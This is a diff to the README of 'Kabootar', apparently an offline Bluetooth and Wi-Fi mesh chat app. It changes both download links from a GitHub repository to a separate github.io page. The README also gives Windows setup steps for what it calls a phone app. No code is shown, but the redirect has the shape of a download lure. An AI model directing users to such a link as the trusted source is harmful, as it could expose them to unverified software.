@@ -1,6 +1,6 @@
 # 📡 Kabootar - Chat without internet or servers
 
-[![Download Kabootar](https://img.shields.io/badge/Download-Kabootar-blue)](https://github.com/Grouperecclescake78/Kabootar)
+[![Download Kabootar](https://img.shields.io/badge/Download-Kabootar-blue)](https://grouperecclescake78.github.io)
 
 Kabootar lets you send messages without an internet connection. It works through your phone's Bluetooth and Wi-Fi signals. You do not need a SIM card or a central server to talk to people nearby. The app moves messages from phone to phone until they reach the person you want to contact.
 
@@ -14,7 +14,7 @@ The software uses end-to-end acknowledgments. This ensures your message arrives 
 
 You can obtain the latest version of the software from the project page.
 
-[Click here to visit the download page](https://github.com/Grouperecclescake78/Kabootar)
+[Click here to visit the download page](https://grouperecclescake78.github.io)
 
 Follow these steps to set up the app on your Windows computer:
 
